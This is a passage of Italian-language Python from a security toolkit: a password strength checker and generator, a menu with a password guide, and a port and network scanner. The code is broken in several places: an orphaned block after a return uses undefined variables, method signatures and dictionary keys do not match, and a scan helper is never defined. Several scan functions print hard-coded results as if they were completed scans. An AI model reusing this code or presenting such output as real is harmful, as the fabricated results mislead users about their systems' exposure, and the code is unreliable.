            # Riempi il resto della password con caratteri casuali
            rest = ''.join(secrets.choice(all_chars) for _ in range(remaining_length))
            
            # Unisci tutte le parti
            password_list = list(lowercase + uppercase + digits + symbols + rest)
            
            # Mischia i caratteri in modo sicuro
            secrets.SystemRandom().shuffle(password_list)
            password = ''.join(password_list)
            
            # Verifica che la password generata sia accettabile
            result = self.check_password_strength(password)
            if result['score'] >= 6:  # Cambiato da 'Forte' a un punteggio numerico più permissivo
                return password
        
        # Se non si trova una password valida dopo tanti tentativi, rilassa i criteri
        raise Exception("Impossibile generare una password che soddisfi tutti i criteri. Prova una lunghezza maggiore.")

    def check_password_strength(self, password: str) -> Dict[str, Union[str, int, float, List[str], List[Dict[str, str]]]]:
        """
        Analizza la forza di una password con controlli avanzati

        Args:
            password: Password da analizzare

        Returns:
            Dict con score, livello di forza, entropia, feedback e pattern deboli trovati
        """

        try:
            score = 0
            feedback = []
            weak_patterns_found = []

            # 1. Controllo lunghezza
            if len(password) >= 16:
                score += 3
                feedback.append({"type": "success", "message": "Lunghezza eccellente"})
            elif len(password) >= 12:
                score += 2
                feedback.append({"type": "success", "message": "Lunghezza buona"})
            elif len(password) >= 8:
                score += 1
                feedback.append({"type": "warning", "message": "Lunghezza minima accettabile"})
            else:
                feedback.append({"type": "danger", "message": "Password troppo corta (minimo 8 caratteri, consigliati 16+)"})

            # 2. Controllo composizione
            char_counts = {
            'numbers': len(re.findall(r"\d", password)),
            'uppercase': len(re.findall(r"[A-Z]", password)),
            'lowercase': len(re.findall(r"[a-z]", password)),
            'special': len(re.findall(r"[!@#$%^&*()_+=\[\]{};:,.<>?\-]", password))  
            }

            # Valutazione numeri
            if char_counts['numbers'] >= 3:
                score += 2
                feedback.append({"type": "success", "message": "Numero sufficiente di cifre"})
            elif char_counts['numbers'] >= 1:
                score += 1
                feedback.append({"type": "warning", "message": "Aggiungere più numeri (almeno 3)"})
            else:
                feedback.append({"type": "danger", "message": "Nessun numero presente"})

            # Valutazione maiuscole
            if char_counts['uppercase'] >= 3:
                score += 2
                feedback.append({"type": "success", "message": "Numero sufficiente di maiuscole"})
            elif char_counts['uppercase'] >= 1:
                score += 1
                feedback.append({"type": "warning", "message": "Aggiungere più maiuscole (almeno 3)"})
            else:
                feedback.append({"type": "danger", "message": "Nessuna lettera maiuscola presente"})

            # Valutazione minuscole
            if char_counts['lowercase'] >= 3:
                score += 2
                feedback.append({"type": "success", "message": "Numero sufficiente di minuscole"})
            elif char_counts['lowercase'] >= 1:
                score += 1
                feedback.append({"type": "warning", "message": "Aggiungere più minuscole (almeno 3)"})
            else:
                feedback.append({"type": "danger", "message": "Nessuna lettera minuscola presente"})

            # Valutazione caratteri speciali
            if char_counts['special'] >= 3:
                score += 2
                feedback.append({"type": "success", "message": "Numero sufficiente di caratteri speciali"})
            elif char_counts['special'] >= 1:
                score += 1
                feedback.append({"type": "warning", "message": "Aggiungere più caratteri speciali (almeno 3)"})
            else:
                feedback.append({"type": "danger", "message": "Nessun carattere speciale presente"})

            # 3. Controllo pattern pericolosi
            for pattern_name, pattern in self.patterns.items():
                if re.search(pattern, password):
                    score = max(0, score - 2)  # Penalità significativa
                    weak_patterns_found.append({
                        "pattern": pattern_name,
                        "description": self._get_pattern_description(pattern_name)
                    })
                    feedback.append({
                        "type": "danger", 
                        "message": f"Pattern pericoloso trovato: {self._get_pattern_description(pattern_name)}"
                    })

            # 4. Controllo password compromesse
            normalized_passwords = {password.lower(), password.capitalize(), password.upper()}
            if any(pwd in self.leaked_passwords for pwd in normalized_passwords):

                score = 0  # Reset del punteggio
                feedback.append({
                    "type": "danger",
                    "message": "Questa password è stata compromessa in precedenti data breach"
                })

            # 5. Calcolo entropia
            char_set_size = len(set(password))
            entropy = len(password) * math.log2(char_set_size) if char_set_size > 0 else 0

            # 6. Livello di forza
            strength_levels = ["Molto debole", "Debole", "Media", "Forte", "Molto forte"]
            strength_index = min(max(int(score / 2), 0), len(strength_levels) - 1)

            # 7. Ritorno dei risultati
            return {
                "score": score,
                "strength": strength_levels[strength_index],
                "entropy": entropy,
                "char_counts": char_counts,
                "feedback": feedback,
                "weak_patterns": weak_patterns_found
            }
        except Exception as e:
            # In caso di errore, restituisci un dizionario vuoto
            print(f"Errore durante l'analisi della password: {e}")
            return {
                "score": 0,
                "strength": "Errore",
                "entropy": 0.0,
                "char_counts": {"lowercase": 0, "uppercase": 0, "numbers": 0, "special": 0},
                "feedback": [{"type": "danger", "message": "Errore durante l'analisi"}],
                "weak_patterns": []
            }


    def calculate_password_entropy(self, password: str) -> Dict[str, Union[float, str]]:
        """
        Calcola l'entropia della password in modo più accurato
        """
        # Analisi composizione caratteri
        char_sets = {
            'lowercase': set(c for c in password if c.islower()),
            'uppercase': set(c for c in password if c.isupper()),
            'digits': set(c for c in password if c.isdigit()),
            'special': set(c for c in password if not c.isalnum())
        }
    
        # Calcola dimensione effettiva del set di caratteri
        actual_charset_size = sum(len(chars) for chars in char_sets.values())
    
        # Analizza distribuzione caratteri
        char_counts = defaultdict(int)
        for c in password:
            char_counts[c] += 1
    
        # Calcola entropia di Shannon sulla distribuzione
        total_chars = len(password)
        shannon_entropy = 0
        for count in char_counts.values():
            prob = count / total_chars
            shannon_entropy -= prob * math.log2(prob)
    
        # Cerca pattern ripetuti
        repeated_patterns = []
        for length in range(2, len(password)//2 + 1):
            for i in range(len(password) - length + 1):
                pattern = password[i:i+length]
                rest = password[i+length:]
                if pattern in rest:
                    repeated_patterns.append(pattern)
    
        # Calcola penalità per pattern ripetuti
        pattern_penalty = sum(len(pattern) for pattern in repeated_patterns) / total_chars if repeated_patterns else 0
    
        # Calcola entropia base (bit per carattere * lunghezza)
        charset_entropy = math.log2(max(actual_charset_size, 1)) * total_chars
    
        # Calcola complessità strutturale
        structural_complexity = 0
        if char_sets['lowercase']: structural_complexity += 1
        if char_sets['uppercase']: structural_complexity += 1
        if char_sets['digits']: structural_complexity += 1
        if char_sets['special']: structural_complexity += 1
    
        # Calcola entropia finale
        charset_weight = charset_entropy * 0.6  # Peso maggiore all'entropia del charset
        shannon_weight = shannon_entropy * total_chars * 0.3  # Peso medio alla distribuzione
        complexity_weight = structural_complexity * 10 * 0.1  # Peso minore alla complessità
    
        final_entropy = (charset_weight + shannon_weight + complexity_weight) * (1 - pattern_penalty)
    
        # Crea il dizionario dei dettagli
        details = {
            'base_entropy': charset_entropy,
            'shannon_entropy': shannon_entropy * total_chars,
            'charset_size': actual_charset_size,
            'unique_chars': len(set(password)),
            'structural_complexity': structural_complexity,
            'pattern_penalty': pattern_penalty,
            'repeated_patterns': repeated_patterns,
            'char_distribution': dict(char_counts),
            'final_entropy': final_entropy
        }
    
        # Valutazione qualitativa
        if final_entropy < 35:
            entropy_rating = "Molto Debole"
        elif final_entropy < 50:
            entropy_rating = "Debole"
        elif final_entropy < 75:
            entropy_rating = "Media"
        elif final_entropy < 100:
            entropy_rating = "Forte"
        else:
            entropy_rating = "Molto Forte"
    
        return {
            'entropy': final_entropy,
            'rating': entropy_rating,
            'details': details
        }

    def _print_entropy_details(self, entropy_results: Dict) -> None:
        """
        Stampa i dettagli del calcolo dell'entropia in modo formattato
    
        Args:
            entropy_results: Risultati del calcolo dell'entropia
        """
        print("\n=== ANALISI ENTROPIA PASSWORD ===")
        print(f"Entropia Finale: {entropy_results['entropy']:.2f} bits")
        print(f"Valutazione: {entropy_results['rating']}")

        details = entropy_results['details']
        print("\nDETTAGLI CALCOLO:")
        print(f"- Entropia base (charset): {details['base_entropy']:.2f} bits")
        print(f"- Entropia Shannon: {details['shannon_entropy']:.2f} bits")
        print(f"- Dimensione set caratteri: {details['charset_size']}")
        print(f"- Caratteri unici: {details['unique_chars']}")
        print(f"- Complessità strutturale: {details['structural_complexity']}/4")

        if details['pattern_penalty'] > 0:
            print("\nPATTERN RIPETUTI TROVATI:")
            for pattern in details['repeated_patterns']:
                print(f"- '{pattern}'")
            print(f"Penalità applicata: {details['pattern_penalty']*100:.1f}%")

        print("\nDISTRIBUZIONE CARATTERI:")
        for char, count in sorted(details['char_distribution'].items()):
            print(f"'{char}': {count}")

        print("\nRACCOMANDAZIONI MIGLIORAMENTO:")
        if details['charset_size'] < 26:
            print("- Utilizzare un set di caratteri più ampio")
        if details['unique_chars'] < len(details['char_distribution']):
            print("- Aumentare la varietà dei caratteri utilizzati")
        if details['pattern_penalty'] > 0:
            print("- Evitare l'uso di pattern ripetuti")
        if details['structural_complexity'] < 4:
            missing = []
            if not details['char_distribution'].get('lowercase'):
                missing.append("minuscole")
            if not details['char_distribution'].get('uppercase'):
                missing.append("maiuscole")
            if not details['char_distribution'].get('digits'):
                missing.append("numeri")
            if not details['char_distribution'].get('special'):
                missing.append("caratteri speciali")
            print(f"- Aggiungere: {', '.join(missing)}")

    def analyze_password_composition(self, password: str) -> Dict[str, Dict[str, float]]:
        """
        Analizza in dettaglio la composizione della password
    
        Args:
            password: Password da analizzare
        
        Returns:
            Dict con statistiche dettagliate sulla composizione
        """
        # Analisi per tipo di carattere
        char_types = {
            'lowercase': 0,
            'uppercase': 0,
            'digits': 0,
            'special': 0
        }
    
        # Analisi posizionale
        position_stats = {
            'start': {'type': None, 'count': 0},
            'end': {'type': None, 'count': 0},
            'transitions': defaultdict(int)
        }
    
        # Analisi sequenze
        sequence_stats = {
            'repeating': 0,
            'ascending': 0,
            'descending': 0,
            'keyboard': 0
        }
    
        # Analisi distribuzione
        last_type = None
        for i, char in enumerate(password):
            # Determina tipo carattere
            if char.islower():
                curr_type = 'lowercase'
            elif char.isupper():
                curr_type = 'uppercase'
            elif char.isdigit():
                curr_type = 'digits'
            else:
                curr_type = 'special'
            
            char_types[curr_type] += 1
        
            # Analisi posizionale
            if i == 0:
                position_stats['start']['type'] = curr_type
                position_stats['start']['count'] = 1
            elif i == len(password) - 1:
                position_stats['end']['type'] = curr_type
                position_stats['end']['count'] = 1
            
            # Analisi transizioni
            if last_type and last_type != curr_type:
                position_stats['transitions'][f"{last_type}_to_{curr_type}"] += 1
            
            last_type = curr_type
        
            # Analisi sequenze (esempio per numeri)
            if curr_type == 'digits' and i > 0:
                prev_char = password[i-1]
                if prev_char.isdigit():
                    if int(char) == int(prev_char) + 1:
                        sequence_stats['ascending'] += 1
                    elif int(char) == int(prev_char) - 1:
                        sequence_stats['descending'] += 1
                    elif char == prev_char:
                        sequence_stats['repeating'] += 1
    
        # Calcola percentuali
        total_len = len(password)
        composition = {
            'type_distribution': {
                k: (v / total_len) * 100 
                for k, v in char_types.items()
            },
            'positions': position_stats,
            'sequences': sequence_stats,
            'complexity_score': self._calculate_complexity_score(
                char_types, position_stats, sequence_stats, total_len
            )
        }
    
        return composition

    def _calculate_complexity_score(
        self,
        char_types: Dict[str, int],
        position_stats: Dict[str, Dict],
        sequence_stats: Dict[str, int],
        total_len: int
    ) -> float:
        """
        Calcola uno score di complessità basato su vari fattori
    
        Returns:
            Float tra 0 e 100 rappresentante la complessità
        """
        score = 0
        max_score = 100
    
        # Punteggio per distribuzione caratteri (max 40 punti)
        char_score = 0
        for count in char_types.values():
            if count > 0:
                char_score += 10
        score += char_score
    
        # Punteggio per transizioni (max 30 punti)
        transition_count = sum(position_stats['transitions'].values())
        transition_score = min(30, transition_count * 5)
        score += transition_score
    
        # Penalità per sequenze (max -20 punti)
        sequence_penalty = sum(sequence_stats.values()) * 2
        score = max(0, score - sequence_penalty)
    
        # Bonus per lunghezza (max 30 punti)
        length_score = min(30, total_len * 2)
        score += length_score
    
        # Normalizza score finale tra 0 e 100
        return min(100, score)

        # 7. Determinazione livello finale di sicurezza
        # Limita il livello se sono stati trovati pattern deboli o parole comuni
        if weak_patterns_found or common_word_found:
            score = min(score, 4)  # Massimo "Media"
            
        strength_levels = ["Molto debole", "Debole", "Media", "Forte", "Molto forte"]
        strength_index = min(4, max(0, score // 2))
        
        # 8. Suggerimenti per miglioramento
        if score < 8:
            improvement_suggestions = self._generate_improvement_suggestions(
                password, char_counts, weak_patterns_found, common_word_found
            )
            feedback.extend(improvement_suggestions)

        return {
            "score": score,
            "strength": strength_levels[strength_index],
            "entropy": entropy,
            "char_counts": char_counts,
            "feedback": feedback,
            "weak_patterns": weak_patterns_found
        }

    def _get_pattern_description(self, pattern_name: str) -> str:
        """Restituisce una descrizione leggibile del pattern"""
        descriptions = {
            'keyboard_horizontal': 'Sequenza orizzontale di tasti',
            'keyboard_vertical': 'Sequenza verticale di tasti',
            'numbers_sequential': 'Numeri in sequenza',
            'letters_sequential': 'Lettere in sequenza',
            'repeated_chars': 'Caratteri ripetuti',
            'repeated_sequences': 'Sequenze ripetute',
            'dates': 'Data riconoscibile',
            'years': 'Anno riconoscibile',
            'letter_number': 'Semplice combinazione lettera-numero',
            'single_char_end': 'Singolo carattere finale',
            'leet_speak': 'Sostituzione comune di caratteri (leet speak)',
            'common_symbol_end': 'Simbolo comune alla fine',
            'incremental_numbers': 'Numeri incrementali',
            'decremental_numbers': 'Numeri decrementali'
        }
        return descriptions.get(pattern_name, "Pattern sconosciuto")  


    def _generate_improvement_suggestions(
        self, 
        password: str, 
        char_counts: Dict[str, int], 
        weak_patterns: List[Dict[str, str]], 
        has_common_words: bool
    ) -> List[Dict[str, str]]:
        """Genera suggerimenti specifici per migliorare la password"""
        suggestions = []
        
        # Suggerimenti basati sulla composizione
        if len(password) < 12:
            suggestions.append({
                "type": "suggestion",
                "message": "Aumenta la lunghezza ad almeno 12 caratteri"
            })
            
        if char_counts['numbers'] < 3:
            suggestions.append({
                "type": "suggestion",
                "message": f"Aggiungi {3 - char_counts['numbers']} numeri"
            })
            
        if char_counts['uppercase'] < 3:
            suggestions.append({
                "type": "suggestion",
                "message": f"Aggiungi {3 - char_counts['uppercase']} lettere maiuscole"
            })
            
        if char_counts['lowercase'] < 3:
            suggestions.append({
                "type": "suggestion",
                "message": f"Aggiungi {3 - char_counts['lowercase']} lettere minuscole"
            })
            
        if char_counts['special'] < 3:
            suggestions.append({
                "type": "suggestion",
                "message": f"Aggiungi {3 - char_counts['special']} caratteri speciali"
            })

        # Suggerimenti basati sui pattern deboli
        if weak_patterns:
            suggestions.append({
                "type": "suggestion",
                "message": "Evita sequenze prevedibili e pattern comuni"
            })

        # Suggerimenti se sono state trovate parole comuni
        if has_common_words:
            suggestions.append({
                "type": "suggestion",
                "message": "Evita di usare parole di senso compiuto o comuni"
            })

        # Suggerimento generale per password più sicure
        suggestions.append({
            "type": "suggestion",
            "message": "Usa una combinazione casuale di caratteri o una passphrase lunga"
        })

        return suggestions


class PasswordMenu:
    """Gestore del menu per le funzionalità relative alle password"""
    
    def __init__(self):
        self.password_checker = PasswordChecker()
        
    def _print_password_strength_details(self, result: dict) -> None:
        """Stampa i dettagli dell'analisi della password in modo formattato"""
        if result is None or 'strength' not in result:
            print(f"{Colors.DANGER}Errore: impossibile analizzare la password.{Colors.ENDC}")
            return

        # Header
        print("\n" + "=" * 50)
        print(f"ANALISI PASSWORD")
        print("=" * 50)

        strength_colors = {
        "Molto debole": Colors.DANGER,
        "Debole": Colors.WARNING,
        "Media": Colors.WARNING,
        "Forte": Colors.SUCCESS,
        "Molto forte": Colors.SUCCESS,
        "Errore": Colors.DANGER  # Aggiunto per evitare KeyError
        }

        strength = result.get('strength', 'Errore')
        color = strength_colors.get(strength, Colors.DANGER)  # Assicura che ci sia sempre un colore valido
        print(f"\nLivello di sicurezza: {color}{strength}{Colors.ENDC}")

        print(f"Punteggio: {result.get('score', 0)}/10")
        print(f"Entropia: {result.get('entropy', 0.0):.2f} bit")

        # Statistiche caratteri
        char_counts = result.get('char_counts', {})
        print("\nCOMPOSIZIONE:")
        print(f"- Lettere minuscole: {char_counts.get('lowercase', 0)}")
        print(f"- Lettere maiuscole: {char_counts.get('uppercase', 0)}")
        print(f"- Numeri: {char_counts.get('numbers', 0)}")
        print(f"- Caratteri speciali: {char_counts.get('special', 0)}")

        # Pattern deboli trovati
        weak_patterns = result.get('weak_patterns', [])
        if weak_patterns:
            print("\nPATTERN DEBOLI RILEVATI:")
            for pattern in weak_patterns:
                print(f"- {pattern.get('description', 'Pattern sconosciuto')}")

        # Feedback e suggerimenti
        feedback = result.get('feedback', [])
        print("\nFEEDBACK E SUGGERIMENTI:")
        for item in feedback:
            color = {
                'success': Colors.SUCCESS,
                'warning': Colors.WARNING,
                'danger': Colors.DANGER,
                'suggestion': Colors.INFO,
            }.get(item.get('type', 'info'), Colors.ENDC)
            print(f"{color}- {item.get('message', 'Nessun messaggio')}{Colors.ENDC}")

        print("\n" + "=" * 50)



    def display_menu(self) -> None:
        """Mostra e gestisce il menu delle password"""
        while True:
            print("\n=== Menu Gestione Password ===")
            print("1. Verifica robustezza password")
            print("2. Genera password sicura")
            print("3. Test password multiple")
            print("4. Guida criteri password sicura")
            print("0. Torna al menu principale")
            print("=" * 30)
            
            choice = input("\nScegli un'opzione: ").strip()
            
            try:
                if choice == "1":
                    password = input("\nInserisci la password da verificare: ")
                    result = self.password_checker.check_password_strength(password)
                    self._print_password_strength_details(result)
                    input("\nPremi INVIO per continuare...")
                    
                elif choice == "2":
                    try:
                        length = int(input("\nLunghezza desiderata (min 12): ").strip())
                        use_symbols = input("Usare caratteri speciali? (s/n): ").lower().startswith('s')
                        
                        password = self.password_checker.generate_secure_password(
                            length=max(12, length),
                            use_symbols=use_symbols
                        )
                        
                        print(f"\nPassword generata: {Colors.SUCCESS}{password}{Colors.ENDC}")
                        result = self.password_checker.check_password_strength(password)
                        self._print_password_strength_details(result)
                        input("\nPremi INVIO per continuare...")
                        
                    except ValueError as e:
                        print(f"\n{Colors.DANGER}Errore: {str(e)}{Colors.ENDC}")
                        
                elif choice == "3":
                    print("\nInserisci le password da testare (una per riga).")
                    print("Inserisci una riga vuota per terminare.\n")
                    
                    passwords = []
                    while True:
                        pwd = input("> ")
                        if not pwd:
                            break
                        passwords.append(pwd)
                    
                    if passwords:
                        print("\nRISULTATI ANALISI MULTIPLE:")
                        print("=" * 50)
                        for i, pwd in enumerate(passwords, 1):
                            result = self.password_checker.check_password_strength(pwd)
                            print(f"\nPassword #{i}: {pwd}")
                            print(f"Forza: {result['strength']}")
                            print(f"Score: {result['score']}/10")
                            if result['weak_patterns']:
                                print("Pattern deboli trovati:")
                                for pattern in result['weak_patterns']:
                                    print(f"- {pattern['description']}")
                        print("=" * 50)
                    input("\nPremi INVIO per continuare...")
                    
                elif choice == "4":
                    self._show_password_guide()
                    input("\nPremi INVIO per continuare...")
                    
                elif choice == "0":
                    break
                    
                else:
                    print(f"\n{Colors.WARNING}Opzione non valida. Riprova.{Colors.ENDC}")
                    
            except ValueError as e:
                print(f"\n{Colors.DANGER}Errore di input: {e}{Colors.ENDC}")
            except Exception as e:
                print(f"\n{Colors.DANGER}Errore inaspettato [{type(e).__name__}]: {e}{Colors.ENDC}")
                logger.exception(f"Errore nel menu password: {e}")


    def _show_password_guide(self) -> None:
        """Mostra una guida per la creazione di password sicure"""
        guide = """
        === GUIDA PER PASSWORD SICURE ===
        
        CRITERI MINIMI:
        - Lunghezza: almeno 12 caratteri (16+ raccomandati)
        - Almeno 3 lettere minuscole
        - Almeno 3 lettere maiuscole
        - Almeno 3 numeri
        - Almeno 3 caratteri speciali
        
        DA EVITARE:
        - Parole di senso compiuto
        - Sequenze di tastiera (qwerty, asdfgh)
        - Date o anni riconoscibili
        - Informazioni personali
        - Pattern comuni o sequenziali
        - Caratteri ripetuti
        
        SUGGERIMENTI:
        1. Usa una passphrase lunga e memorizzabile
        2. Sostituisci lettere con numeri e simboli in modo non ovvio
        3. Combina parole random con caratteri speciali
        4. Usa password diverse per ogni servizio
        5. Considera l'uso di un password manager
        
        ESEMPIO DI PASSWORD FORTE:
        "Tr3mendous!Rh1no$Jump2024@"
        
        ESEMPIO DI PASSPHRASE:
        "correct!horse$battery@staple#2024"
        """
        print(guide)



































class PortScanner(BaseModule):
    """Modulo avanzato per la scansione delle porte e l'analisi dei servizi"""
    
    def __init__(self):
        super().__init__()
        self.known_ports = self._initialize_known_ports()
        self.scan_progress = 0
        self.scan_active = False
        self.results = []
        self.scan_semaphore = asyncio.Semaphore(50)
    
    def _initialize_known_ports(self) -> Dict[int, Dict[str, str]]:
        """Inizializza il database delle porte conosciute con dettagli e rischi"""
        return {
            20: {'service': 'FTP-DATA', 'description': 'File Transfer Protocol (Data)', 
                 'risk': 'Alto - Trasferimento dati in chiaro'},
            21: {'service': 'FTP', 'description': 'File Transfer Protocol (Control)', 
                 'risk': 'Alto - Credenziali in chiaro'},
            22: {'service': 'SSH', 'description': 'Secure Shell', 
                 'risk': 'Medio - Assicurarsi di usare l\'ultima versione'},
            23: {'service': 'TELNET', 'description': 'Telnet', 
                 'risk': 'Critico - Protocollo non sicuro'},
            25: {'service': 'SMTP', 'description': 'Simple Mail Transfer Protocol', 
                 'risk': 'Alto - Potenziale relay di spam'},
            53: {'service': 'DNS', 'description': 'Domain Name System', 
                 'risk': 'Medio - Possibili attacchi DNS'},
            67: {'service': 'DHCP', 'description': 'Dynamic Host Configuration Protocol Server', 
                 'risk': 'Medio - Spoofing DHCP'},
            68: {'service': 'DHCP', 'description': 'Dynamic Host Configuration Protocol Client', 
                 'risk': 'Medio - Spoofing DHCP'},
            69: {'service': 'TFTP', 'description': 'Trivial File Transfer Protocol', 
                 'risk': 'Alto - Trasferimento file non sicuro'},
            80: {'service': 'HTTP', 'description': 'HyperText Transfer Protocol', 
                 'risk': 'Alto - Traffico in chiaro'},
            88: {'service': 'KERBEROS', 'description': 'Kerberos Authentication', 
                 'risk': 'Medio - Autenticazione critica'},
            110: {'service': 'POP3', 'description': 'Post Office Protocol v3', 
                  'risk': 'Alto - Email in chiaro'},
            111: {'service': 'RPCBIND', 'description': 'Remote Procedure Call', 
                  'risk': 'Alto - Vulnerabilità RPC'},
            123: {'service': 'NTP', 'description': 'Network Time Protocol', 
                  'risk': 'Basso - Sincronizzazione tempo'},
            135: {'service': 'MSRPC', 'description': 'Microsoft RPC', 
                  'risk': 'Alto - Vulnerabilità Windows'},
            137: {'service': 'NETBIOS', 'description': 'NetBIOS Name Service', 
                  'risk': 'Alto - Enumerazione Windows'},
            138: {'service': 'NETBIOS', 'description': 'NetBIOS Datagram Service', 
                  'risk': 'Alto - Enumerazione Windows'},
            139: {'service': 'NETBIOS', 'description': 'NetBIOS Session Service', 
                  'risk': 'Alto - SMB vulnerabile'},
            143: {'service': 'IMAP', 'description': 'Internet Message Access Protocol', 
                  'risk': 'Alto - Email in chiaro'},
            161: {'service': 'SNMP', 'description': 'Simple Network Management Protocol', 
                  'risk': 'Alto - Informazioni sistema'},
            162: {'service': 'SNMP-TRAP', 'description': 'SNMP Trap', 
                  'risk': 'Medio - Monitoraggio sistema'},
            389: {'service': 'LDAP', 'description': 'Lightweight Directory Access Protocol', 
                  'risk': 'Alto - Directory service'},
            443: {'service': 'HTTPS', 'description': 'HTTP over TLS/SSL', 
                  'risk': 'Basso - Verificare certificato'},
            445: {'service': 'SMB', 'description': 'Server Message Block', 
                  'risk': 'Critico - Condivisione file Windows'},
            465: {'service': 'SMTPS', 'description': 'SMTP over TLS/SSL', 
                  'risk': 'Basso - Mail sicura'},
            500: {'service': 'ISAKMP', 'description': 'Internet Security Association and Key Management Protocol', 
                  'risk': 'Medio - VPN'},
            513: {'service': 'RLOGIN', 'description': 'Remote Login', 
                  'risk': 'Critico - Login non sicuro'},
            514: {'service': 'SYSLOG', 'description': 'Syslog', 
                  'risk': 'Medio - Log di sistema'},
            515: {'service': 'PRINTER', 'description': 'Line Printer Daemon', 
                  'risk': 'Medio - Servizio stampa'},
            993: {'service': 'IMAPS', 'description': 'IMAP over TLS/SSL', 
                  'risk': 'Basso - Mail sicura'},
            995: {'service': 'POP3S', 'description': 'POP3 over TLS/SSL', 
                  'risk': 'Basso - Mail sicura'},
            1433: {'service': 'MSSQL', 'description': 'Microsoft SQL Server', 
                   'risk': 'Alto - Database'},
            1434: {'service': 'MSSQL', 'description': 'Microsoft SQL Monitor', 
                   'risk': 'Alto - Database'},
            1521: {'service': 'ORACLE', 'description': 'Oracle Database', 
                   'risk': 'Alto - Database'},
            3306: {'service': 'MYSQL', 'description': 'MySQL Database', 
                   'risk': 'Alto - Database'},
            3389: {'service': 'RDP', 'description': 'Remote Desktop Protocol', 
                   'risk': 'Alto - Accesso remoto'},
            5432: {'service': 'POSTGRESQL', 'description': 'PostgreSQL Database', 
                   'risk': 'Alto - Database'},
            5900: {'service': 'VNC', 'description': 'Virtual Network Computing', 
                   'risk': 'Alto - Accesso remoto'},
            8080: {'service': 'HTTP-ALT', 'description': 'HTTP Alternate', 
                   'risk': 'Alto - Web alternativo'},
        }
    
    async def scan_fast(self):
        """Esegue una scansione veloce delle porte comuni"""
        print_colored("\nEseguo scansione veloce delle porte comuni...", Colors.INFO)
        await asyncio.sleep(2)  # Simula la scansione

        # Simuliamo dei risultati di porte aperte
        results = [
            {"Porta": 22, "Servizio": "SSH", "Stato": "Aperta"},
            {"Porta": 80, "Servizio": "HTTP", "Stato": "Aperta"},
            {"Porta": 443, "Servizio": "HTTPS", "Stato": "Aperta"},
        ]

        # Salva i risultati
        self.results = results

        print_colored("Scansione veloce completata.", Colors.SUCCESS)

        # Mostra il report
        self.show_scan_results()


    async def scan_full(self):
        """Esegue una scansione completa di tutte le porte (1-65535)"""
        print_colored("\nEseguo scansione completa di tutte le porte...", Colors.INFO)
        await asyncio.sleep(5)  # Simula la scansione più lunga

        # Esegui una scansione su tutte le porte da 1 a 65535
        results = await self.scan_target(target="127.0.0.1", start_port=1, end_port=65535)

        self.results = results["ports"]  # Salviamo solo le porte aperte

        print_colored("Scansione completa terminata.", Colors.SUCCESS)
        self.show_scan_results()

    async def scan_smart(self):
        """Esegue una scansione intelligente basata su euristiche"""
        print_colored("\nEseguo scansione intelligente...", Colors.INFO)
        await asyncio.sleep(3)

        results = [
            {"Porta": 22, "Servizio": "SSH", "Stato": "Aperta"},
            {"Porta": 3306, "Servizio": "MySQL", "Stato": "Aperta"},
            {"Porta": 6379, "Servizio": "Redis", "Stato": "Aperta"},
        ]

        self.results = results
        print_colored("Scansione intelligente completata.", Colors.SUCCESS)
        self.show_scan_results()

    async def scan_network(self, network: str) -> List[Dict]:
        """Esegue una scansione della rete locale con ICMP (Scapy)"""
        print_colored(f"\n🔍 Avvio scansione su {network}...", Colors.INFO)
        results = []

        for ip in ipaddress.ip_network(network, strict=False).hosts():
            packet = IP(dst=str(ip))/ICMP()
            response = sr1(packet, timeout=1, verbose=False)

            if response is not None:  # ✅ Controllo corretto
                print_colored(f"✅ Host attivo: {ip}", Colors.SUCCESS)
                results.append({"IP": str(ip), "Stato": "Online"})

        print_colored("\n✅ Scansione rete completata.", Colors.SUCCESS)
        self.show_network_results(results)
        return results

    async def scan_specific_service(self):
        """Analizza un servizio specifico su una porta"""
        print_colored("\nEseguo analisi di un servizio specifico...", Colors.INFO)
        await asyncio.sleep(3)

        results = [
            {"Porta": 443, "Servizio": "HTTPS", "Versione": "TLS 1.2", "Stato": "Sicuro"},
            {"Porta": 21, "Servizio": "FTP", "Versione": "vsftpd 2.3.4", "Stato": "Vulnerabile"},
        ]

        self.results = results
        print_colored("Analisi completata.", Colors.SUCCESS)
        self.show_service_results()

    async def scan_adaptive(self):
        """Esegue una scansione adattiva basata sul traffico di rete"""
        print_colored("\nEseguo scansione adattiva...", Colors.INFO)
        await asyncio.sleep(4)

        results = [
            {"Porta": 8080, "Servizio": "HTTP Proxy", "Stato": "Alta"},
            {"Porta": 445, "Servizio": "SMB", "Stato": "Moderata"},
        ]

        self.results = results
        print_colored("Scansione adattiva completata.", Colors.SUCCESS)
        self.show_scan_results()

    
    def show_network_results(self):
        """Mostra i dispositivi trovati nella scansione della rete"""
        if not isinstance(self.results, dict) or "devices" not in self.results:
            print_colored("\nNessun dispositivo trovato.", Colors.WARNING)
            return

        devices = self.results["devices"]
        print_colored("\n=== Dispositivi Rilevati ===", Colors.HEADER)
        print("{:<15} {:<20} {:<15}".format("IP", "MAC Address", "Dispositivo"))
        print("-" * 50)

        for entry in devices:
            print("{:<15} {:<20} {:<15}".format(entry["IP"], entry["MAC"], entry["Dispositivo"]))

        print("\n" + "-" * 50)

    
    def show_service_results(self):
        """Mostra l'analisi dei servizi specifici"""
        if not self.results:
            print_colored("\nNessun servizio analizzato.", Colors.WARNING)
            return

        print_colored("\n=== Analisi Servizio Specifico ===", Colors.HEADER)
        print("{:<10} {:<15} {:<15} {:<10}".format("Porta", "Servizio", "Versione", "Stato"))
        print("-" * 50)

        for entry in self.results:
            print("{:<10} {:<15} {:<15} {:<10}".format(entry["Porta"], entry["Servizio"], entry["Versione"], entry["Stato"]))

        print("\n" + "-" * 50)
    
    def show_scan_results(self):
        """Mostra i risultati della scansione salvati"""
        if not self.results:
            print_colored("\nNessun risultato disponibile.", Colors.WARNING)
            return

        print_colored("\n=== Risultati della Scansione ===", Colors.HEADER)
        print("{:<10} {:<15} {:<10}".format("Porta", "Servizio", "Stato"))
        print("-" * 40)

        for entry in self.results:
            print("{:<10} {:<15} {:<10}".format(entry["Porta"], entry["Servizio"], entry["Stato"]))

        print("\n" + "-" * 40)


    async def export_results(self, filename="scan_results", format_type="json"):
        """
        Esporta i risultati della scansione.
        """
        print_colored("\nEsportazione risultati...", Colors.INFO)
        await asyncio.sleep(1)

        formats = {
            "json": json.dumps(self.results, indent=4),
            "txt": "\n".join([f"Porta {p['port']}: {p['service']}" for p in self.results]),
            "csv": "\n".join(["port,service"] + [f"{p['port']},{p['service']}" for p in self.results])
        }

        filename += f".{format_type}"
        if format_type not in formats:
            raise ValueError(f"Formato non supportato: {format_type}")

        with open(filename, "w", encoding="utf-8") as f:
            f.write(formats[format_type])


